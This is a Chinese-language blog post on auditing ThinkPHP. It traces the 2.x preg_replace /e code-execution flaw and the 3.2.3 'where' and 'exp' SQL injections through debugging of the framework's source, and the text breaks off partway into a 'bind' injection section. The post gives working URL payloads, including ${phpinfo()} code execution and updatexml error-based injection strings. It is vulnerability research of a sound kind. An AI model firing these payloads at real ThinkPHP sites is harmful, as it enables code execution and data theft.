@@ -1,0 +1,2500 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>ThinkPHP 代码审计 | Tree's Blog</title><meta name="author" content="Tree"><meta name="copyright" content="Tree"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="ThinkPHP代码审计 基础URL和路由：https:&#x2F;&#x2F;blog.csdn.net&#x2F;lthirdonel&#x2F;article&#x2F;details&#x2F;88775620 thinkphp内置了几种方法，在ThinkPHP&#x2F;Common&#x2F;functions.php，比如I()，M()等等 A 快速实例化Action类库  B 执行行为类  C 配置参数存取方法  D 快速实例化Model类库  F 快速简单文">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ThinkPHP 代码审计">
+<meta property="og:url" content="http://example.com/2023/07/08/ThinkPHP-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/index.html">
+<meta property="og:site_name" content="Tree&#39;s Blog">
+<meta property="og:description" content="ThinkPHP代码审计 基础URL和路由：https:&#x2F;&#x2F;blog.csdn.net&#x2F;lthirdonel&#x2F;article&#x2F;details&#x2F;88775620 thinkphp内置了几种方法，在ThinkPHP&#x2F;Common&#x2F;functions.php，比如I()，M()等等 A 快速实例化Action类库  B 执行行为类  C 配置参数存取方法  D 快速实例化Model类库  F 快速简单文">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/todis21/image/main/wallhaven-y8wozk_2560x1440.png">
+<meta property="article:published_time" content="2023-07-08T04:50:35.000Z">
+<meta property="article:modified_time" content="2023-07-08T05:22:28.808Z">
+<meta property="article:author" content="Tree">
+<meta property="article:tag" content="PHP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/todis21/image/main/wallhaven-y8wozk_2560x1440.png"><link rel="shortcut icon" href="/img/favicon.jfif"><link rel="canonical" href="http://example.com/2023/07/08/ThinkPHP-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: undefined,
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'ThinkPHP 代码审计',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-07-08 13:22:28'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/bg.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/favicon.jfif" onerror="onerror=null;src='/img/404.png'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">42</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://raw.githubusercontent.com/todis21/image/main/wallhaven-y8wozk_2560x1440.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Tree's Blog"><span class="site-name">Tree's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">ThinkPHP 代码审计</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-07-08T04:50:35.000Z" title="发表于 2023-07-08 12:50:35">2023-07-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-07-08T05:22:28.808Z" title="更新于 2023-07-08 13:22:28">2023-07-08</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="ThinkPHP 代码审计"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="ThinkPHP代码审计"><a href="#ThinkPHP代码审计" class="headerlink" title="ThinkPHP代码审计"></a>ThinkPHP代码审计</h1><p><img src="https://image.3001.net/images/20200908/1599567391.png" alt="img"></p>
+<h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>URL和路由：<a target="_blank" rel="noopener" href="https://blog.csdn.net/lthirdonel/article/details/88775620">https://blog.csdn.net/lthirdonel/article/details/88775620</a></p>
+<p>thinkphp内置了几种方法，在<code>ThinkPHP/Common/functions.php</code>，比如I()，M()等等</p>
+<pre><code>A 快速实例化Action类库 
+B 执行行为类 
+C 配置参数存取方法 
+D 快速实例化Model类库 
+F 快速简单文本数据存取方法 
+I http获取参数
+L 语言参数存取方法 
+M 快速高性能实例化模型 
+R 快速远程调用Action类方法 
+S 快速缓存存取方法 
+U URL动态生成和重定向方法 
+W 快速Widget输出方法
+</code></pre>
+<h2 id="ThinkPHP-2-x"><a href="#ThinkPHP-2-x" class="headerlink" title="ThinkPHP 2.x"></a>ThinkPHP 2.x</h2><h3 id="preg-replace-x2F-e模式代码执行漏洞"><a href="#preg-replace-x2F-e模式代码执行漏洞" class="headerlink" title="preg_replace &#x2F;e模式代码执行漏洞"></a>preg_replace &#x2F;e模式代码执行漏洞</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43749601/article/details/113417093">https://blog.csdn.net/weixin_43749601/article/details/113417093</a></p>
+<p>在2.1版本中存在大量preg_replace()函数使用了<code>/e</code>模式，如果参数可控，有可能存在任意代码执行漏洞（php&lt;7）</p>
+<p>下面的<code>@e</code>和<code>/e</code>是一样的</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703120726229.png" alt="image-20230703120726229"></p>
+<p>在<code>ThinkPHP/Lib/Think/Util/Dispatcher.class.php</code>中，Dispatcher类的dispatch方法里</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703121414905.png" alt="image-20230703121414905"></p>
+<p><code>Dispatcher.class.php</code> 文件负责接收用户发送的请求，并根据路由规则将请求分发到相应的控制器（Controller）和方法（Action）。它会解析 URL，并根据定义的路由规则进行匹配，然后确定要执行的控制器和方法。</p>
+<p>根据ThinkPHP对路由的解析，对这部分代码进行调试和分析</p>
+<pre><code>http://xx.xx.xx.xx/index.php/模块/控制器/操作
+
+http://127.0.0.1/index.php/a/b/c/d
+</code></pre>
+<p>首先，通过 <code>C(&#39;URL_MODEL&#39;)</code> 获取 URL 的模式，然后根据不同的模式进行不同的处理，这里是默认模式</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703141034997.png" alt="image-20230703141034997"></p>
+<p>接下来，如果配置文件中开启了子域名部署（<code>APP_SUB_DOMAIN_DEPLOY</code> 为真），则会根据规则对子域名进行路由处理。这里为false，直接跳过了</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703141414294.png" alt="image-20230703141414294"></p>
+<p>然后根据配置文件中的设置获取 URL 的分隔符 (<code>URL_PATHINFO_DEPR</code>)，并调用 <code>getPathInfo()</code> 函数来分析 URL 的 PATHINFO 信息</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703141608989.png" alt="image-20230703141608989"></p>
+<p>接下来是路由检测和解析的部分。首先会调用 <code>routerCheck()</code> 函数检测是否有自定义的路由规则。如果没有自定义的路由规则，则按照默认规则进行调度。它会先根据 URL 分隔符将 <code>$_SERVER[&#39;PATH_INFO&#39;]</code> 进行切割，得到一个路径的数组 <code>$paths</code></p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703141759745.png" alt="image-20230703141759745"></p>
+<p>然后到preg_replace函数</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703141926792.png" alt="image-20230703141926792"></p>
+<p>在<code>preg_replace()</code>函数中，正则表达式中使用了&#x2F;e模式，将“替换字符串”作为PHP代码求值，并用其结果来替换所搜索的字符串</p>
+<p>上面正则表达式可以简化为<code>\w+/([\^\/])</code>，即搜索获取“&#x2F;”前后的两个参数，$var[‘\1’]&#x3D;”\2”;是对数组的操作，将之前搜索到的第一个值作为新数组的键，将第二个值作为新数组的值，我们发现可以构造搜索到的第二个值，即可执行任意PHP代码</p>
+<pre><code>$res = preg_replace(&#39;@(\w+)&#39;.$depr.&#39;([^&#39;.$depr.&#39;\/]+)@e&#39;, &#39;$var[\&#39;\\1\&#39;]=&quot;\\2&quot;;&#39;, implode($depr,$paths));
+
+$res = preg_replace(&#39;@(\w+)&#39;.$depr.&#39;([^&#39;.$depr.&#39;\/]+)@e&#39;, &#39;$var[\&#39;\\1\&#39;]=&quot;\\2&quot;;&#39;, &#39;c/d&#39;);
+</code></pre>
+<p>在PHP当中，${}是可以构造一个变量的，{}写的是一般的字符，那么就会被当成变量，比如${a}等价于$a，那如果{}写的是一个已知函数名称呢？那么这个函数就会被执行</p>
+<p>所以只要构造成这样：</p>
+<pre><code>$res = preg_replace(&#39;@(\w+)&#39;.$depr.&#39;([^&#39;.$depr.&#39;\/]+)@e&#39;, &#39;$var[\&#39;\\1\&#39;]=&quot;\\2&quot;;&#39;, &#39;c/$&#123;phpinfo()&#125;&#39;);
+</code></pre>
+<p>访问：<code>http://127.0.0.1/index.php/a/b/c/$&#123;phpinfo()&#125;</code>出现报错</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703143247858.png" alt="image-20230703143247858"></p>
+<p>加上<code>@</code>进行错误抑制即可</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703143407449.png" alt="image-20230703143407449"></p>
+<p>后面版本的更新中，<code>preg_replace</code>被替换了：</p>
+<p>输入的${phpinfo()}被当成了字符串被strip_tags()处理了</p>
+<pre><code>$res = preg_replace(&#39;@(\w+)&#39;.$depr.&#39;([^&#39;.$depr.&#39;\/]+)@e&#39;, &#39;$var[\&#39;\\1\&#39;]=strip_tags(\&#39;\\2\&#39;);&#39;, implode($depr,$paths));
+</code></pre>
+<h2 id="ThinkPHP-3-x"><a href="#ThinkPHP-3-x" class="headerlink" title="ThinkPHP 3.x"></a>ThinkPHP 3.x</h2><h3 id="3-2-3-where-注入"><a href="#3-2-3-where-注入" class="headerlink" title="3.2.3 where 注入"></a>3.2.3 where 注入</h3><p>配置控制器和数据库</p>
+<p><code>Application/Home/Controller/IndexController.class.php</code></p>
+<pre><code class="php">public function index()
+&#123;
+$data = M(&#39;users&#39;)-&gt;find(I(&#39;GET.id&#39;));
+var_dump($data);
+&#125;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703174513551.png" alt="image-20230703174513551"></p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703174604563.png" alt="image-20230703174604563"></p>
+<p>访问测试：</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703174640702.png" alt="image-20230703174640702"></p>
+<p>对传入<code>id=1</code>，跟着调试看看</p>
+<pre><code class="php">public function index()
+    &#123;
+        $data = M(&#39;users&#39;)-&gt;find(I(&#39;GET.id&#39;));
+        var_dump($data);
+    &#125;
+</code></pre>
+<p>首先调用了M()方法,大概就是连接数据库，创建Model对象，位置在<code>ThinkPHP/Mode/Lite/Model.class.php</code></p>
+<pre><code class="php">/**
+ * 实例化一个没有模型文件的Model
+ * @param string $name Model名称 支持指定基础模型 例如 MongoModel:User
+ * @param string $tablePrefix 表前缀
+ * @param mixed $connection 数据库连接信息
+ * @return Think\Model
+ */
+function M($name = &#39;&#39;, $tablePrefix = &#39;&#39;, $connection = &#39;&#39;)
+&#123;
+    static $_model = array();
+    if (strpos($name, &#39;:&#39;)) &#123;
+        list($class, $name) = explode(&#39;:&#39;, $name);
+    &#125; else &#123;
+        $class = &#39;Think\\Model&#39;;
+    &#125;
+    $guid = (is_array($connection) ? implode(&#39;&#39;, $connection) : $connection) . $tablePrefix . $name . &#39;_&#39; . $class;
+    if (!isset($_model[$guid])) &#123;
+        $_model[$guid] = new $class($name, $tablePrefix, $connection);
+    &#125;
+
+    return $_model[$guid];
+&#125;
+</code></pre>
+<p>结束后调用I()方法，获取和解析http请求GET id的值，这里面调用了下面的方法进行安全过滤</p>
+<pre><code class="php">function think_filter(&amp;$value)
+&#123;
+    // TODO 其他安全过滤
+
+    // 过滤查询特殊字符
+    if (preg_match(&#39;/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i&#39;, $value)) &#123;
+        $value .= &#39; &#39;;
+    &#125;
+</code></pre>
+<p>然后调用Model()类的find()方法，将传入的id做为参数，又会经过<code>ThinkPHP/Library/Think/Model.class.php</code>的 <code>_parseOptions()</code>方法</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703200750666.png" alt="image-20230703200750666"></p>
+<p>跟进这个方法：</p>
+<p>里面存在字段类型验证</p>
+<pre><code class="php">if (isset($options[&#39;where&#39;]) &amp;&amp; is_array($options[&#39;where&#39;]) &amp;&amp; !empty($fields) &amp;&amp; !isset($options[&#39;join&#39;])) &#123;
+            // 对数组查询条件进行字段类型检查
+            foreach ($options[&#39;where&#39;] as $key =&gt; $val) &#123;
+                $key = trim($key);
+                if (in_array($key, $fields, true)) &#123;
+                    if (is_scalar($val)) &#123;
+                        $this-&gt;_parseType($options[&#39;where&#39;], $key);
+                    &#125;
+                &#125; elseif (!is_numeric($key) &amp;&amp; &#39;_&#39; != substr($key, 0, 1) &amp;&amp; false === strpos($key, &#39;.&#39;) &amp;&amp; false === strpos($key, &#39;(&#39;) &amp;&amp; false === strpos($key, &#39;|&#39;) &amp;&amp; false === strpos($key, &#39;&amp;&#39;)) &#123;
+                    if (!empty($this-&gt;options[&#39;strict&#39;])) &#123;
+                        E(L(&#39;_ERROR_QUERY_EXPRESS_&#39;) . &#39;:[&#39; . $key . &#39;=&gt;&#39; . $val . &#39;]&#39;);
+                    &#125;
+                    unset($options[&#39;where&#39;][$key]);
+                &#125;
+            &#125;
+        &#125;
+</code></pre>
+<p>其中<code>_parseType()</code>函数</p>
+<pre><code class="php">protected function _parseType(&amp;$data, $key)
+    &#123;
+        if (!isset($this-&gt;options[&#39;bind&#39;][&#39;:&#39; . $key]) &amp;&amp; isset($this-&gt;fields[&#39;_type&#39;][$key])) &#123;
+            $fieldType = strtolower($this-&gt;fields[&#39;_type&#39;][$key]);
+            if (false !== strpos($fieldType, &#39;enum&#39;)) &#123;
+                // 支持ENUM类型优先检测
+            &#125; elseif (false === strpos($fieldType, &#39;bigint&#39;) &amp;&amp; false !== strpos($fieldType, &#39;int&#39;)) &#123;
+                $data[$key] = intval($data[$key]);
+            &#125; elseif (false !== strpos($fieldType, &#39;float&#39;) || false !== strpos($fieldType, &#39;double&#39;)) &#123;
+                $data[$key] = floatval($data[$key]);
+            &#125; elseif (false !== strpos($fieldType, &#39;bool&#39;)) &#123;
+                $data[$key] = (bool) $data[$key];
+            &#125;
+        &#125;
+    &#125;
+</code></pre>
+<p>在这把id进行了强制类型转换，然后返回给<code>_parseOptions()</code>，最终带入<code>$this-&gt;db-&gt;select($options)</code>进行查询避免了注入问题。</p>
+<p>理一下 传入<code>id=1 </code>-&gt; <code>I()</code> -&gt; <code>find()</code> -&gt; <code>_parseOptions()</code> -&gt; <code>_parseType()</code> 然后将我们的字符串清理了。 要知道id参数被改变的时间点在<code>_parseType()</code>中，那进入这个方法要满足</p>
+<pre><code class="php">if (isset($options[&#39;where&#39;]) &amp;&amp; is_array($options[&#39;where&#39;]) &amp;&amp; !empty($fields) &amp;&amp; !isset($options[&#39;join&#39;]))
+</code></pre>
+<p>​	<img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703204546122.png" alt="image-20230703204546122"></p>
+<p>然后使用报错注入</p>
+<pre><code>?id[where]=1 and 1=updatexml(1,concat(0x7e,(select database()),0x7e),1)%23
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703204642573.png" alt="image-20230703204642573"></p>
+<h3 id="3-2-3-exp注入"><a href="#3-2-3-exp注入" class="headerlink" title="3.2.3 exp注入"></a>3.2.3 exp注入</h3><p>配置控制器</p>
+<pre><code class="php">public function index()
+&#123;
+    $User = D(&#39;Users&#39;);
+    $map = array(&#39;username&#39; =&gt; $_GET[&#39;username&#39;]);
+    // $map = array(&#39;username&#39; =&gt; I(&#39;username&#39;));
+    $user = $User-&gt;where($map)-&gt;find();
+    var_dump($user);
+&#125;
+</code></pre>
+<p>测试</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703213910460.png" alt="image-20230703213910460"></p>
+<p>调试:</p>
+<p><code>username=aaa</code> –&gt; <code>find()</code>,运行到select()这里</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703214601265.png" alt="image-20230703214601265"></p>
+<p>跟进</p>
+<p><code>username=aaa</code> –&gt; <code>find()</code> –&gt; <code>select()</code> ,</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703214650903.png" alt="image-20230703214650903"></p>
+<p>根进<code>buildSelectSql</code></p>
+<p><code>username=aaa</code> –&gt; <code>find()</code> –&gt; <code>select()</code>–&gt;<code>buildSelectSql()</code></p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703214849497.png" alt="image-20230703214849497"></p>
+<p>没有进入if判断，直接执行<code>parseSql()</code>,跟进查看</p>
+<p><code>username=aaa</code> –&gt; <code>find()</code> –&gt; <code>select()</code>–&gt;<code>buildSelectSql()</code>–&gt;<code>parseSql()</code></p>
+<pre><code class="php">public function parseSql($sql, $options = array())
+    &#123;
+        $sql = str_replace(
+            array(&#39;%TABLE%&#39;, &#39;%DISTINCT%&#39;, &#39;%FIELD%&#39;, &#39;%JOIN%&#39;, &#39;%WHERE%&#39;, &#39;%GROUP%&#39;, &#39;%HAVING%&#39;, &#39;%ORDER%&#39;, &#39;%LIMIT%&#39;, &#39;%UNION%&#39;, &#39;%LOCK%&#39;, &#39;%COMMENT%&#39;, &#39;%FORCE%&#39;),
+            array(
+                $this-&gt;parseTable($options[&#39;table&#39;]),
+                $this-&gt;parseDistinct(isset($options[&#39;distinct&#39;]) ? $options[&#39;distinct&#39;] : false),
+                $this-&gt;parseField(!empty($options[&#39;field&#39;]) ? $options[&#39;field&#39;] : &#39;*&#39;),
+                $this-&gt;parseJoin(!empty($options[&#39;join&#39;]) ? $options[&#39;join&#39;] : &#39;&#39;),
+                $this-&gt;parseWhere(!empty($options[&#39;where&#39;]) ? $options[&#39;where&#39;] : &#39;&#39;),
+                $this-&gt;parseGroup(!empty($options[&#39;group&#39;]) ? $options[&#39;group&#39;] : &#39;&#39;),
+                $this-&gt;parseHaving(!empty($options[&#39;having&#39;]) ? $options[&#39;having&#39;] : &#39;&#39;),
+                $this-&gt;parseOrder(!empty($options[&#39;order&#39;]) ? $options[&#39;order&#39;] : &#39;&#39;),
+                $this-&gt;parseLimit(!empty($options[&#39;limit&#39;]) ? $options[&#39;limit&#39;] : &#39;&#39;),
+                $this-&gt;parseUnion(!empty($options[&#39;union&#39;]) ? $options[&#39;union&#39;] : &#39;&#39;),
+                $this-&gt;parseLock(isset($options[&#39;lock&#39;]) ? $options[&#39;lock&#39;] : false),
+                $this-&gt;parseComment(!empty($options[&#39;comment&#39;]) ? $options[&#39;comment&#39;] : &#39;&#39;),
+                $this-&gt;parseForce(!empty($options[&#39;force&#39;]) ? $options[&#39;force&#39;] : &#39;&#39;),
+            ), $sql);
+        return $sql;
+    &#125;
+</code></pre>
+<p>部分是通过<code>parse</code>系列函数来构建SQL语句，关注点在<code>parseWhere()</code>函数，跟进到parseWhere()里面</p>
+<p><code>username=aaa</code> –&gt; <code>find()</code> –&gt; <code>select()</code>–&gt;<code>buildSelectSql()</code>–&gt;<code>parseSql()</code>–&gt;<code>parseWhere()</code></p>
+<p>在parseWhere()里无论进行什么操作，都会进入<code>parseWhereItem</code>,</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703220403708.png" alt="image-20230703220403708"></p>
+<p>进入<code>parseWhereItem</code></p>
+<p><code>username=aaa</code> –&gt; <code>find()</code> –&gt; <code>select()</code>–&gt;<code>buildSelectSql()</code>–&gt;<code>parseSql()</code>–&gt;<code>parseWhere()</code> –&gt; <code>parseWhereItem()</code></p>
+<p>在这个方法里，发现直接拼接</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703221843199.png" alt="image-20230703221843199"></p>
+<p>但是需要满足条件才能进入这里</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703222022145.png" alt="image-20230703222022145"></p>
+<p>构造payload，调试一下</p>
+<pre><code>?username[0]=exp&amp;username[1]=1
+</code></pre>
+<p>成功进入</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703222152915.png" alt="image-20230703222152915"></p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703222237736.png" alt="image-20230703222237736"></p>
+<p>成功拼接，但是拼接结果是</p>
+<pre><code>`username`1
+</code></pre>
+<p>缺少了<code>=</code></p>
+<p>payload</p>
+<pre><code>?username[0]=exp&amp;username[1]==1
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703222625578.png" alt="image-20230703222625578"></p>
+<p>测试单引号，出现报错</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703222855437.png" alt="image-20230703222855437"></p>
+<p>直接报错注入</p>
+<pre><code>?username[0]=exp&amp;username[1]==1 and updatexml(1,concat(0x7e,database(),0x7e),1)
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703223003151.png" alt="image-20230703223003151"></p>
+<p>在开头的控制器中，使用了</p>
+<pre><code class="php">$map = array(&#39;username&#39; =&gt; $_GET[&#39;username&#39;]);
+</code></pre>
+<p>而不是</p>
+<pre><code class="php">$map = array(&#39;username&#39; =&gt; I(&#39;username&#39;));
+</code></pre>
+<p>因为<code>I()</code>方法中存在安全过滤,<code>EXP</code>被过滤了</p>
+<pre><code class="php">function think_filter(&amp;$value)
+&#123;
+    // TODO 其他安全过滤
+
+    // 过滤查询特殊字符
+if (preg_match(&#39;/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i&#39;, $value)) &#123;
+        $value .= &#39; &#39;;
+&#125;
+</code></pre>
+<h3 id="3-2-3-bind注入"><a href="#3-2-3-bind注入" class="headerlink" title="3.2.3 bind注入"></a>3.2.3 bind注入</h3><p>控制器配置：这个控制器是指根据id修改对应的password</p>
+<pre><code class="php">public function index()
+&#123;
+    $User = M(&quot;Users&quot;);
+    $user[&#39;id&#39;] = I(&#39;id&#39;);
+    $data[&#39;password&#39;] = I(&#39;password&#39;);
+    $valu = $User-&gt;where($user)-&gt;save($data);
+    var_dump($valu);
+&#125;
+</code></pre>
+<p>测试：</p>
+<pre><code>http://127.0.0.1/index.php?id=1&amp;password=aabb
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704091236162.png" alt="image-20230704091236162"></p>
+<p>调试过程：</p>
+<p><code>id=1&amp;password=aabb</code>–&gt;<code>save()</code></p>
+<p><code>sava</code>方法前面进行数据处理，和表达式分析，后面会运行到<code>updata()</code></p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704103705460.png" alt="image-20230704103705460"></p>
+<p>跟进查看</p>
+<p><code>id=1&amp;password=aabb</code>–&gt;<code>save()</code>–&gt;<code>update()</code></p>
+<pre><code class="php">public function update($data, $options)
+    &#123;
